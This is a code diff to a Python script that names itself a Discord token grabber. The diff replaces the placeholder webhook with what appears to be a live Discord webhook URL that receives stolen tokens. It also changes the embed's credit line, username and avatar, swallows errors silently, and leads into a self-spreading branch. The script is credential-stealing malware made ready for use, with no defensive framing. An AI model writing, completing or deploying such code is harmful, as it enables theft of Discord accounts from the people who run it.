@@ -164,7 +164,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token grabber by social.#0069"
+                    "text": f"Token grabber by social.#0007"
                 }
             }
             embeds.append(embed)
@@ -177,11 +177,11 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+        "username": "ダチ",
+        "avatar_url": "https://i.pinimg.com/originals/be/01/8e/be018e38bffe82606fa38b4dab72e360.jpg"
     }
     try:
-        urlopen(Request("Your server webhook here", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/796260160766738452/gkLJAWysqU7-qAaEW6k3fiSFbwtmf_gtyGAiIyxoHk_cHR8fZ0aBOeTlI_5n-wpMFXHr", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
